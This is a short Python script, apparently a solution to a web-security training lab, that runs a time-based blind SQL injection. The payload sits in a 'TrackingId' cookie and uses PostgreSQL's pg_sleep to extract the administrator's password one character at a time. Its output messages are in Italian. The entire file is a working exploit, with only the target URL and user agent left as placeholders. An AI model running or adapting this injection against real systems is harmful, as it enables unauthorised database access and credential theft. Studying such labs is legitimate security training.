import requests
import time
import requests
import time 

url = 'URL'


headers = {
    'User-Agent': 'USERAGENT',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive'
}
password_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
          

def find_password(url, headers):
    start_time = time.time()
    result = []  
    session = requests.Session()  

    for param in range(1, 21):  
        for value in password_chars:
            
            cookie_value = f"COOKIE' || (SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, {param}, 1) = '{value}') = 1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
            cookies = {'TrackingId': cookie_value}

           
            response = session.get(url, headers=headers, cookies=cookies)
            elapsed_time = response.elapsed.total_seconds()
            print(elapsed_time)            
            if elapsed_time > 1:
                result.append(value)
                print(f"[+] Carattere trovato: {value} → Password parziale: {''.join(result)}")
                break  
    end_time = time.time()
    execution_time = end_time - start_time  
    print(f"\n[!] Tempo di esecuzione: {execution_time:.4f} secondi")            
    return ''.join(result) 


password = find_password(url, headers)
print(f"\n[!] Password trovata: {password}")
